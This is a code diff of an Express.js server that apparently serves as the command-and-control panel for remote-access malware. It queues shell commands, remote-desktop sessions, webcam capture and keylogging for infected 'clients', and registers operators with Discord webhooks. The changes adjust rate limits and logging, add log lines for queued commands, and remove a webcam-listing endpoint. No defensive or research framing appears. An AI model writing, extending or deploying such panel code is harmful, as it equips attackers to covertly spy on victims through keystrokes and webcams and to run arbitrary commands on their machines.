@@ -76,7 +76,8 @@ app.use(cookieParser());
 app.use((req, res, next) => {
   const t = Date.now();
   res.on('finish', () => {
-    console.log(`[http] ${req.method} ${req.url} ${req.ip} -> ${res.statusCode} (${Date.now() - t}ms)`);
+    const skip = req.path.includes('/screen') || req.path.endsWith('/webcam');
+    if (!skip) console.log(`[http] ${req.method} ${req.url} ${req.ip} -> ${res.statusCode} (${Date.now() - t}ms)`);
   });
   next();
 });
@@ -98,21 +99,16 @@ app.use(express.json({ limit: '256kb' }));
 
 const limit = (opts) => rateLimit({ standardHeaders: true, legacyHeaders: false, ...opts });
 const limitGlobal = limit({
-  windowMs: 60_000, max: 240,
+  windowMs: 60_000, max: 600,
   message: { error: 'too many requests' },
   skip: (req) =>
     req.path.endsWith('/screen') ||
     req.path.endsWith('/input') ||
     req.path.endsWith('/monitors') ||
-    req.path.endsWith('/rdp/start') ||
-    req.path.endsWith('/rdp/stop') ||
-    req.path.endsWith('/rdp/update') ||
     req.path.endsWith('/webcam') ||
-    req.path.endsWith('/webcam/start') ||
+    req.path.endsWith('/rdp/update') ||
+    req.path.endsWith('/rdp/stop') ||
     req.path.endsWith('/webcam/stop') ||
-    req.path.endsWith('/webcam/list') ||
-    req.path.endsWith('/keylog') ||
-    req.path.endsWith('/keylog/start') ||
     req.path.endsWith('/keylog/stop'),
 });
 const limitAuth     = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'too many attempts, slow down' } });
@@ -177,7 +173,6 @@ app.get('/api/health', (_req, res) => {
              time: new Date().toISOString() });
 });
 
-// ---------- auth ----------
 app.post('/api/signup', limitAuth, async (req, res) => {
   const { username, email, password, discordWebhook } = req.body || {};
   if (!username || !email || !password || !discordWebhook)
@@ -273,7 +268,6 @@ app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
   res.json({ ok: true });
 });
 
-// ---------- clients ----------
 app.get('/api/clients', requireAuth, (req, res) => {
   const status = String(req.query.status || 'all').toLowerCase();
   const q      = String(req.query.q || '').trim();
@@ -362,6 +356,7 @@ app.post('/api/clients/:id/exec', requireAuth, (req, res) => {
     VALUES (?, ?, ?, ?, 'pending', ?)
   `).run(req.user.uid, clientId, shell, line, Date.now());
 
+  console.log(`[exec] queued cmd ${info.lastInsertRowid} to client ${clientId}: ${shell} ${line}`);
   res.json({ ok: true, commandId: Number(info.lastInsertRowid) });
 });
 
@@ -382,7 +377,6 @@ app.delete('/api/clients/:id', requireAuth, (req, res) => {
   res.json({ ok: true });
 });
 
-// ---------- rdp ----------
 app.post('/api/clients/:id/rdp/start', requireAuth, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
@@ -398,11 +392,12 @@ app.post('/api/clients/:id/rdp/start', requireAuth, (req, res) => {
     mouse:    req.body.mouse === true,
   };
 
-  db.prepare(sql`
+  const info = db.prepare(sql`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'rdp', ?, 'pending', ?)
   `).run(req.user.uid, cid, JSON.stringify(cfg), Date.now());
 
+  console.log(`[rdp] start queued to client ${cid}`);
   res.json({ ok: true });
 });
 
@@ -410,10 +405,12 @@ app.post('/api/clients/:id/rdp/stop', requireAuth, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
+
   db.prepare(sql`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'rdp', '{"stop":true}', 'pending', ?)
   `).run(req.user.uid, cid, Date.now());
+
   res.json({ ok: true });
 });
 
@@ -452,7 +449,6 @@ app.post('/api/clients/:id/input', requireAuth, (req, res) => {
   res.json({ ok });
 });
 
-// ---------- webcam ----------
 app.post('/api/clients/:id/webcam/start', requireAuth, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
@@ -471,6 +467,7 @@ app.post('/api/clients/:id/webcam/start', requireAuth, (req, res) => {
     VALUES (?, ?, 'webcam', ?, 'pending', ?)
   `).run(req.user.uid, cid, JSON.stringify(cfg), Date.now());
 
+  console.log(`[webcam] start queued to client ${cid}`);
   res.json({ ok: true });
 });
 
@@ -481,17 +478,6 @@ app.post('/api/clients/:id/webcam/stop', requireAuth, (req, res) => {
   db.prepare(sql`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'webcam', '{"stop":true}', 'pending', ?)
-  `).run(req.user.uid, cid, Date.now());
-  res.json({ ok: true });
-});
-
-app.post('/api/clients/:id/webcam/list', requireAuth, (req, res) => {
-  const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
-  db.prepare(sql`
-    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
-    VALUES (?, ?, 'webcam', '{"list":true}', 'pending', ?)
   `).run(req.user.uid, cid, Date.now());
   res.json({ ok: true });
 });
@@ -507,7 +493,6 @@ app.get('/api/clients/:id/webcam', requireAuth, (req, res) => {
   res.send(jpeg);
 });
 
-// ---------- keylog ----------
 app.post('/api/clients/:id/keylog/start', requireAuth, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
@@ -553,7 +538,6 @@ app.delete('/api/clients/:id/keylog', requireAuth, (req, res) => {
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });
 
-// ---------- listeners ----------
 const udpSock = startUdp({
   host: CFG.bindHost, port: CFG.udpPort,
   onMsg: (text, rinfo, s) => {
